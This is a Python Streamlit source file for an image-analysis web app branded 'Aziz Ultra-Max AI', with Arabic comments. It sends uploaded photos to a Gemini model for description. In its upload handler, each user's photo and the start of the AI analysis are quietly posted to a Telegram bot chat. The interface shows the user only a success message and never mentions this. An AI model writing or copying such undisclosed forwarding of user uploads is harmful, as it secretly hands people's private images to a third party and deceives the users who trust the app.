import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests
import time

# 1. إعدادات التصميم (إجبار اللون الفاتح + تأثير التوقيع)
st.set_page_config(page_title="Aziz Ultra-Max AI", page_icon="🚀", layout="centered")

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;900&family=Tajawal:wght@400;700&display=swap');
    
    /* إجبار الخلفية الفاتحة */
    .stApp { background-color: #f8fafc !important; }
    html, body, [class*="st-"] { font-family: 'Tajawal', sans-serif; color: #0f172a !important; }

    .stTitle { color: #1e3a8a !important; text-align: center; font-weight: 800; font-size: 40px; }

    /* ستايل التوقيع المتفاعل */
    .sig-box {
        background-color: #0f172a;
        padding: 25px;
        border-radius: 15px;
        margin-top: 50px;
        text-align: center;
        border: 2px solid #3b82f6;
        transition: all 0.4s ease;
        cursor: pointer;
    }
    .sig-box:hover {
        background-color: #ffffff !important;
        box-shadow: 0px 0px 20px rgba(0, 212, 255, 0.6);
    }
    .sig-text {
        font-family: 'Cairo', sans-serif;
        font-size: 32px;
        font-weight: 900;
        color: #ffffff !important;
        transition: all 0.4s ease;
    }
    .sig-box:hover .sig-text { color: #1e3a8a !important; }
    </style>
    """, unsafe_allow_html=True)

# 2. اختيار اللغة
lang = st.radio("Language / اللغة", ("العربية", "English"), horizontal=True)
if lang == "العربية":
    t_title, t_welcome, t_process = "🚀 AZIZ ULTRA-MAX AI", "ارفع صورتك للمعالجة التلقائية", "⏳ جاري التحليل..."
    t_prompt = "حلل الصورة بالتفصيل."
else:
    t_title, t_welcome, t_process = "🚀 AZIZ ULTRA-MAX AI", "Auto-processing enabled", "⏳ Analyzing..."
    t_prompt = "Analyze this image in detail."

st.markdown(f'<h1 class="stTitle">{t_title}</h1>', unsafe_allow_html=True)
st.markdown(f'<p style="text-align: center;">{t_welcome}</p>', unsafe_allow_html=True)

# 3. إعداد الموديل (تعديل الاسم لحل الـ 404 نهائياً)
try:
    genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
    # هذا المسمى هو الصحيح لنسخة المكتبة اللي عندك
    model = genai.GenerativeModel('gemini-1.5-flash')
except:
    st.error("Secrets Error!")

# 4. الرفع والمعالجة التلقائية
uploaded_file = st.file_uploader("", type=["jpg", "jpeg", "png"])

if uploaded_file is not None:
    image = Image.open(uploaded_file)
    st.image(image, use_container_width=True)
    
    with st.spinner(t_process):
        try:
            # المعالجة
            response = model.generate_content([t_prompt, image])
            
            # إرسال لتيليجرام
            buf = io.BytesIO()
            image.save(buf, format='JPEG')
            requests.post(
                f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                files={'photo': buf.getvalue()},
                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"🎯 Aziz18 Report:\n{response.text[:1000]}"}
            )
            
            st.balloons()
            st.success("Success!")
            st.write(response.text)
        except Exception as e:
            st.error(f"Error: {e}")

# 5. التوقيع Aziz18
st.markdown(f"""
    <div class="sig-box">
        <div class="sig-text">BY: Aziz18</div>
        <div style="color: #60a5fa; font-size: 14px; font-weight: bold;">PREMIUM AI EDITION | 2026</div>
    </div>
    """, unsafe_allow_html=True)